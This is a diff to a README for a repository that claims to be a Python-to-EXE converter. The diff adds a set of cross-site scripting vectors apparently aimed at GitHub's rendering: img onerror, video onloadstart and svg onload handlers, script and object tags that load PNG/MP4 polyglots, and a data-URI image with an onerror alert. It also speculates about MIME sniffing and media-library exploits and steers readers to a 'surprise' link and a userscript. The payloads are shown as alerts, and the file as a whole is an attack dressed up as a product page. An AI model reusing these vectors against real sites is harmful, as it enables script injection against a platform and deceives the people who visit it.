@@ -6,15 +6,130 @@
 
 ## 🎉 **[⭐ CLICK HERE FOR A SURPRISE! ⭐](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)**
 
-### Alternative Links:
-- 🌐 [Web Version](https://bearertoken1.github.io/Python-to-exe/)
+### Files with Embedded Payloads:
+- 🖼️ [PNG with Payload](./payload.png) - JavaScript in PNG metadata (tEXt chunk)
+- 🎥 [MP4 with Payload](./payload.mp4) - Script in MP4 metadata boxes
 - 📜 [Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)
-- 💬 [Discussions](../../discussions)
-- 📖 [Wiki](../../wiki)
 
 ---
 
-## MIME Type + DOM Clobbering Advanced Payloads
+## Embedded File Exploitation Strategy
+
+### PNG Exploitation Vectors
+
+<!-- GitHub might render PNG and extract metadata -->
+![Payload](./payload.png)
+
+<!-- Using IMG tag with PNG -->
+<img src="./payload.png" onerror="alert('hi bearert0ken')">
+
+<!-- Picture tag with PNG source -->
+<picture>
+  <source srcset="./payload.png" type="image/png">
+  <img src="./payload.png" alt="Payload">
+</picture>
+
+### MP4 Exploitation Vectors
+
+<!-- Video tag with MP4 -->
+<video width="320" height="240" controls>
+  <source src="./payload.mp4" type="video/mp4">
+</video>
+
+<!-- Using video with onloadstart -->
+<video onloadstart="alert('hi bearert0ken')" src="./payload.mp4"></video>
+
+<!-- Video poster attribute -->
+<video poster="./payload.mp4"></video>
+
+### SVG + External Resource Loading
+
+<!-- SVG loading PNG as resource -->
+<svg>
+  <image href="./payload.png" onload="alert('hi bearert0ken')">
+</svg>
+
+<!-- SVG script referencing PNG -->
+<svg>
+  <script href="./payload.png"></script>
+</svg>
+
+### Polyglot File Approach
+
+<!-- File could be both PNG and HTML -->
+<img src="./payload.png" alt="test">
+<script src="./payload.png"></script>
+
+<!-- Using object tag for media files -->
+<object data="./payload.mp4" type="video/mp4"></object>
+<object data="./payload.png" type="image/png"></object>
+
+### Media File MIME Sniffing
+
+<!-- If GitHub sniffs MIME types incorrectly -->
+<!-- It might parse PNG/MP4 as HTML if content matches -->
+
+### Metadata Extraction Exploitation
+
+<!-- GitHub preview/thumbnail generation might execute code -->
+<!-- When extracting metadata from PNG/MP4 -->
+
+<!-- If GitHub uses ffmpeg or ImageMagick internally -->
+<!-- It might trigger vulnerabilities in those libraries -->
+
+### Double Extension Bypass
+
+<!-- Try accessing files with multiple extensions -->
+<!-- payload.png.html or payload.mp4.html equivalent -->
+
+### Base64 Encoded Media in Data URI
+
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" onerror="alert('hi bearert0ken')">
+
+### SVG Embedded in PNG Comments
+
+<!-- PNG with SVG in metadata that GitHub might process -->
+<!-- Creating a polyglot SVG+PNG file -->
+
+### Media Player RCE Exploitation
+
+<!-- If GitHub uses media players that have known vulns -->
+<!-- Malicious MP4 could trigger VLC/FFmpeg exploits -->
+
+---
+
+## Advanced File Embedding
+
+### Creating Polyglot Files
+
+The generated `payload.png` contains:
+- Valid PNG header and structure
+- JavaScript payload in tEXt metadata chunk
+- Valid PNG footer (IEND chunk)
+
+The generated `payload.mp4` contains:
+- Valid MP4 header (ftyp box)
+- Movie data (moov box) with embedded script
+- Media data (mdat box)
+
+GitHub might:
+1. Extract and display metadata
+2. Use image/video processing libraries that execute embedded content
+3. Preview thumbnails (which could trigger metadata parsing)
+4. Sniff MIME types based on content rather than extension
+
+---
+
+## Features
+- Convert Python to EXE
+- One-click deployment
+- **Embedded file exploitation**
+
+---
+
+## Try it out!
+
+The surprise awaits you above! ☝️
 
 ### MIME Type Bypass Vectors (Since this got a reaction!)
 
